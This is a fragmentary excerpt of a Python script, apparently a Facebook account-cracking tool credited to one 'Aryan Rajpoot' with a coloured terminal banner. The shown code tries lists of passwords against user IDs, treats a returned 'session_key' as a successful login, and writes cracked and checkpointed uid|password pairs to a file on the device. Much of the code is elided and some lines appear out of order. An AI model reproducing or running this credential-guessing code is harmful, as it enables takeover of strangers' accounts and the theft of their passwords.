...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Aryan Rajpoot
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : Aryan007
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : MASTER TRICKER ARYAN 
    ...
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [ARYAN-OK] {uid} | {pw}")
                ...
                print(f"\r{cpclr} [Aryan-CP] {uid} | {pw}")
                open("/sdcard/ARYAN/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
            else:
                continue
